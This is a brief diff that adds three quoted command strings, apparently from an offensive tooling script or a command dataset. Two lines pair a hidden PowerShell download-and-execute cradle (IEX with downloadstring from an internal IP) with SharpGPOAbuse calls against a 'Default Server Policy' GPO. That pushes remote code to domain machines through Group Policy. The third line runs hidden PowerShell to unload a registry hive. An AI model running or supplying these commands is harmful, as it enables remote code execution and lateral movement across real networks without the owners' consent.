@@ -1,0 +1,3 @@
+"powershell.exe -WindowStyle Hidden -ArgumentList ""Reg unload $Path""		"
+"powershell.exe -nop -w hidden -c \""IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"""",GPOName => ""Default Server Policy"",bid => $bid), &SharpGPOAbuse_admin);	"
+"powershell.exe -nop -w hidden -c \""IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"""",GPOName => ""Default Server Policy"",bid => $bid), &SharpGPOAbuse_task);"
